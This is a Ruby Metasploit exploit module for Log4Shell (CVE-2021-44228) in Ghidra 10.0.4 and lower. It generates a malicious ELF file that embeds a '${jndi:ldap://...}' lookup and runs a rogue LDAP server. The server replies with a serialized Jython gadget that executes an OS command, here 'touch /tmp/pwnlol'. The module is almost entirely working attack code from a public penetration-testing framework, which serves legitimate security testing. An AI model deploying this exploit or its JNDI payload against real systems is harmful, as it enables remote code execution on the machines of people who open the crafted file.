##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::LdapServer
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ghidra 10.0.4 and lower log4j jndi ldap remote code exection',
        'Description' => %q{
          This module exploits CVE-2021-44228 present in Ghidra < 10.1. The module creates
          a file that, when imported in for analysis into Ghidra, will abuse a
          vulnerability in log4j in order to achieve remote code execution.
        },
        'Author' => [
          'zhuowei', # GhidraLog4Shell
          'timwr', # metasploit module
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'python',
        'Arch' => ARCH_PYTHON,
        'References' => [
          ['CVE', '2021-44228'],
          ['URL', 'https://github.com/advisories/GHSA-jfh8-c2jp-5v3q'],
          ['URL', 'https://www.lunasec.io/docs/blog/log4j-zero-day/'],
          ['URL', 'https://github.com/zhuowei/GhidraLog4Shell'],
        ],
        'Notes' => {
          'AKA' => ['log4shell'],
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Targets' => [ [ 'Custom', {} ] ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-12-09'
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'The output elf file to import into ghidra', 'payload.elf']),
      OptAddress.new('SRVHOST', [ true, 'The local host to listen on for the ldap server. This must be an address on the local machine or 0.0.0.0', '127.0.0.1' ]),
      OptPort.new('SRVPORT', [ true, 'The local port to listen on for the ldap server.', 1389 ]),
    ])
  end

  def make_stage2(python_code)
    placeholder = "\x74\x10\x18PYTHON_CODE_PLACEHOLDER_" + 'A' * 4096
    if python_code.length > 4096
      fail_with Failure::PayloadFailed, "Payload size (#{python_code.length}) exceeds space in payload placeholder"
    end
    code = "\x74\x10\x18" + python_code + ' ' * (4096 + 24 - python_code.length)
    stage2 = exploit_data('CVE-2021-44228', 'jython_gadget').gsub(placeholder, code)
    stage2
  end

  def make_stage2_reply(command, message_id)
    java_class_name_attributes = seq([string('javaClassName'), set([string('java.io.PriorityQueue')])])
    java_serialized_data_attributes = seq([string('javaSerializedData'), set([string(make_stage2(command))])])
    attributes = seq([java_class_name_attributes, java_serialized_data_attributes])
    s = seq([
      int(message_id),
      aseq([string('cn=wtf, dc=example, dc=com'), attributes], SEARCH_RES_ENTRY)
    ])
    s.to_der
  end

  def create_payload_file(ldap_url)
    placeholder = 'LDAP_URL_PLACEHOLDER_' + 'A' * 1024
    if ldap_url.length > 1024
      fail_with Failure::PayloadFailed, "LDAP url size (#{ldap_url.length}) exceeds space in payload placeholder"
    end
    ldap_url += ' ' * (placeholder.length - ldap_url.length)
    filedata = exploit_data('CVE-2021-44228', 'payload_template').gsub(placeholder, ldap_url)
    file_create(filedata)
  end

  def read_ldap(socket)
    buffer = read_ldap_packet(socket)
    print_status("buffer #{buffer.unpack('H*').first}")
    packet = OpenSSL::ASN1.decode(buffer)
    tag = packet.value[1].tag
    return [tag, packet]
  end

  def exploit
    ldap_port = datastore['SRVPORT']
    ldap_host = datastore['SRVHOST']
    ldap = TCPServer.new(ldap_host, ldap_port)
    ldap_url = "${jndi:ldap://#{ldap_host}:#{ldap_port}/abc}"
    print_status("ldap_url: #{ldap_url}")

    create_payload_file(ldap_url)

    begin
      client = ldap.accept

      # this hardcodes an ldap conversation
      # read bindRequest 300c020101600702010304008000
      ldap_response = read_ldap(client)

      # write bindResponse
      client.write(['300c02010161070a010004000400'].pack('H*'))

      # read searchRequest
      ldap_response = read_ldap(client)

      if ldap_response[0] == SEARCH_REQUEST
        message_id = ldap_response[1].value[0].value.to_int

        os_cmd = 'touch /tmp/pwnlol'
        python_code = 'import os\nos.system(\'' + os_cmd + '\')'
        eval_jython = 'eval(compile("' + python_code + '", "", "exec")) or 0'
        # write searchResEntry
        client.write(make_stage2_reply(eval_jython, message_id))

        # write searchResDone
        client.write(search_res_done(message_id))

        read_ldap(client)
      else
        print_error('no LDAP SEARCH_REQUEST')
      end

      client.flush
    ensure
      client.close if client
      ldap.close
    end
  end
end
